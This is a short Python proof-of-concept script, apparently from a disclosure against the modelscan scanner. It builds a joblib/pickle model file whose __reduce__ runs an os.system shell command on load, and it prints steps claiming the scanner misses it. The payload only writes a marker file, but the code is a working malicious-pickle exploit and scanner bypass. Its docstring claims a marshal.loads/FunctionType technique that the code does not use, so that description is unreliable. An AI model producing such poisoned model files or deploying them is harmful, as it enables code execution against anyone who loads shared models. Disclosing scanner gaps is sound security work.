#!/usr/bin/env python3
"""
PoC Generator for modelscan Joblib Bypass
Demonstrates RCE via marshal.loads() + types.FunctionType()
"""
import pickle, joblib, os, types, marshal

class Pwn:
    def __reduce__(self):
        return (os.system, ('echo PWNED_P4 > pwned_p4.txt',))

if __name__ == '__main__':
    joblib.dump(Pwn(), 'rce.joblib')
    print('PoC generated: rce.joblib')
    print()
    print('Reproduction:')
    print('  1. modelscan scan -p rce.joblib   # reports No issues (BYPASS)')
    print('  2. python -c "import joblib; joblib.load(\'rce.joblib\')"')
    print('  3. cat pwned_p4.txt               # PWNED_P4')
